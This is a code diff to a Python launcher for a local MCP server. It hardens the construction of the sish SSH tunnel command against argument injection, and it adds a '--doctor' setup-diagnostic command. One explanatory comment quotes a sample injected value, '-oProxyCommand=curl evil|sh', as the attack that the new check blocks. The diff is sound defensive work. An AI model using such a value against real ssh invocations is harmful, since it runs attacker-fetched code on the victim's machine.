@@ -8,12 +8,12 @@ import os
 import queue
 import re
 import secrets
+import importlib.util
 import shutil
 import signal
 import socket
 import subprocess
 import sys
-import tempfile
 import threading
 import time
 import urllib.error
@@ -23,6 +23,7 @@ from logging.handlers import RotatingFileHandler
 from pathlib import Path
 
 from core import DEFAULT_ALLOWED_COMMANDS
+from core import atomic_write_text as core_atomic_write_text
 
 APP_NAME = "LocalMcpEasy"
 # Pre-2.0 config lived here; migrate_legacy_config_dir() copies it on upgrade.
@@ -201,21 +202,10 @@ def load_config_or_abort() -> dict:
 
 
 def atomic_write_text(path: Path, text: str) -> None:
+    """Config/state writer. newline="\\n" so config.json and runtime.json stay
+    LF on Windows too, matching what the POSIX wrappers read back."""
     path.parent.mkdir(parents=True, exist_ok=True)
-    handle, temp_name = tempfile.mkstemp(
-        dir=path.parent, prefix=f".{path.name}.", suffix=".tmp"
-    )
-    temp = Path(temp_name)
-    try:
-        with os.fdopen(handle, "w", encoding="utf-8", newline="\n") as stream:
-            stream.write(text)
-            stream.flush()
-            os.fsync(stream.fileno())
-        temp.replace(path)
-    except BaseException:
-        with contextlib.suppress(OSError):
-            temp.unlink()
-        raise
+    core_atomic_write_text(path, text, newline="\n")
 
 
 def save_json(path: Path, value: dict) -> None:
@@ -895,19 +885,33 @@ def build_tunnel_command(config: dict) -> list[str]:
                 "sish tunnel backend requires 'tunnel_host' (the sish SSH "
                 "endpoint) in the config."
             )
+        # ssh parses its own argv, so a destination beginning with '-' is read
+        # as an option, not a hostname: a tunnel_host of
+        # "-oProxyCommand=curl evil|sh" would run that command. The value comes
+        # from config.json, which is not attacker-controlled today, but it is
+        # the one string here that reaches ssh unvalidated.
+        if tunnel_host.startswith("-"):
+            raise RuntimeError(
+                f"Invalid tunnel_host {tunnel_host!r}: it must be a hostname, "
+                "not an ssh option."
+            )
         key_path = Path(str(config.get("ssh_key", ""))).expanduser().resolve()
         if not key_path.is_file():
             raise RuntimeError(f"sish private SSH key not found: {key_path}")
         command.extend(["-i", str(key_path), "-o", "IdentitiesOnly=yes"])
         ssh_port = str(config.get("tunnel_ssh_port", "")).strip()
         if ssh_port:
+            if not ssh_port.isdigit():
+                raise RuntimeError(f"Invalid tunnel_ssh_port {ssh_port!r}: expected a number.")
             command.extend(["-p", ssh_port])
         # sish speaks the same ssh -R remote-forward as Serveo; the reserved
         # subdomain (serveo_hostname) is bound on sish's HTTP listener (:80).
         remote = (
             f"{hostname}:80:127.0.0.1:{port}" if hostname else f"80:127.0.0.1:{port}"
         )
-        command.extend(["-R", remote, tunnel_host])
+        # `--` so ssh cannot reinterpret the destination as an option even if
+        # the check above is ever loosened.
+        command.extend(["-R", remote, "--", tunnel_host])
         return command
     if hostname:
         key_path = Path(str(config.get("ssh_key", ""))).expanduser().resolve()
@@ -1522,9 +1526,112 @@ def tunnel_setup() -> int:
     return 0
 
 
+def _doctor_checks(config: dict) -> list[tuple[str, str, str]]:
+    """Return (status, check, detail) rows. status is one of ok / warn / fail.
+
+    Pure and side-effect free so it is testable; doctor() only prints it.
+    """
+    rows: list[tuple[str, str, str]] = []
+
+    def add(ok: bool | None, check: str, detail: str) -> None:
+        rows.append(("ok" if ok else "warn" if ok is None else "fail", check, detail))
+
+    add(sys.version_info >= (3, 10), "python", f"{sys.version.split()[0]} (need >= 3.10)")
+
+    missing = [
+        name for name in ("mcp", "uvicorn", "starlette")
+        if importlib.util.find_spec(name) is None
+    ]
+    add(not missing, "dependencies",
+        "installed" if not missing else f"missing: {', '.join(missing)} -- run START.bat / start.sh")
+
+    add(CONFIG_FILE.exists(), "config.json",
+        str(CONFIG_FILE) if CONFIG_FILE.exists() else f"not found at {CONFIG_FILE} -- run SETUP.bat")
+
+    token = str(config.get("token", ""))
+    add(bool(token), "master token", "set" if token else "missing -- run SETUP.bat")
+
+    workspace = str(config.get("workspace", "")).strip()
+    workspace_dir = Path(workspace) if workspace else None
+    add(bool(workspace_dir and workspace_dir.is_dir()), "workspace",
+        workspace if workspace_dir and workspace_dir.is_dir()
+        else f"not a directory: {workspace}" if workspace
+        else "not configured -- run SETUP.bat")
+
+    auth_mode = config_auth_mode(config)
+    add(True, "auth mode", auth_mode)
+    if auth_mode in ("oauth", "dual"):
+        add(bool(str(config.get("oauth_owner_code", "")).strip()), "owner code",
+            "set" if str(config.get("oauth_owner_code", "")).strip()
+            else "missing -- run OAUTH_SETUP.bat")
+
+    backend = config_tunnel_backend(config)
+    add(True, "tunnel backend", backend)
+    if backend != "custom-ssh":
+        add(bool(shutil.which("ssh")), "ssh client",
+            shutil.which("ssh") or "not found -- install the OpenSSH client")
+    if backend == "sish":
+        host = str(config.get("tunnel_host", "")).strip()
+        add(bool(host) and not host.startswith("-"), "tunnel_host",
+            host or "missing -- run TUNNEL_SETUP.bat")
+        key = str(config.get("ssh_key", "")).strip()
+        add(bool(key) and Path(key).expanduser().is_file(), "sish ssh key",
+            key or "missing -- run TUNNEL_SETUP.bat")
+
+    add(bool(shutil.which("git")) or None, "git",
+        shutil.which("git") or "not on PATH -- the git tools will stay blocked")
+
+    port = int(config.get("port", 8765) or 8765)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe:
+        probe.settimeout(0.4)
+        in_use = probe.connect_ex(("127.0.0.1", port)) == 0
+    running = bool(load_json(RUNTIME_FILE))
+    add(True if not in_use or running else None, f"port {port}",
+        "free" if not in_use else
+        "in use by this launcher (runtime.json present)" if running else
+        "in use by ANOTHER process -- stop it or change the port")
+
+    for label, path in (("server.log", SERVER_LOG), ("tunnel.log", TUNNEL_LOG)):
+        add(True, label, str(path) if path.exists() else "(not created yet)")
+
+    return rows
+
+
+def doctor() -> int:
+    """Diagnose a broken setup in one shot.
+
+    Everything here is a question the maintainer would otherwise have to ask a
+    user one message at a time: is Python new enough, are the dependencies in,
+    is the config readable, is ssh present, is the port already taken.
+    """
+    print(f"\n=== Local MCP Easy {VERSION}: doctor ===\n")
+    try:
+        config = load_config_or_abort()
+    except SystemExit as exc:
+        print(f"fail  config.json     {exc}")
+        return 1
+
+    rows = _doctor_checks(config)
+    width = max(len(check) for _, check, _ in rows)
+    for status, check, detail in rows:
+        print(f"{status:<5} {check:<{width}}  {detail}")
+
+    failures = sum(1 for status, _, _ in rows if status == "fail")
+    warnings = sum(1 for status, _, _ in rows if status == "warn")
+    print("")
+    if failures:
+        print(f"{failures} problem(s) found, {warnings} warning(s). Fix the 'fail' rows above.")
+        return 1
+    print(f"No problems found ({warnings} warning(s)).")
+    return 0
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(
         description=f"One-click launcher for Local MCP Easy {VERSION}"
+    )
+    parser.add_argument(
+        "--doctor", action="store_true", help="diagnose a broken setup and exit"
     )
     parser.add_argument("--setup", action="store_true", help="run the setup wizard again")
     parser.add_argument("--stop", action="store_true", help="stop background processes")
@@ -1561,6 +1668,8 @@ def main() -> int:
 
     migrate_legacy_config_dir()
 
+    if args.doctor:
+        return doctor()
     if args.add_command or args.remove_command:
         return modify_allowed_commands(add=args.add_command, remove=args.remove_command)
 
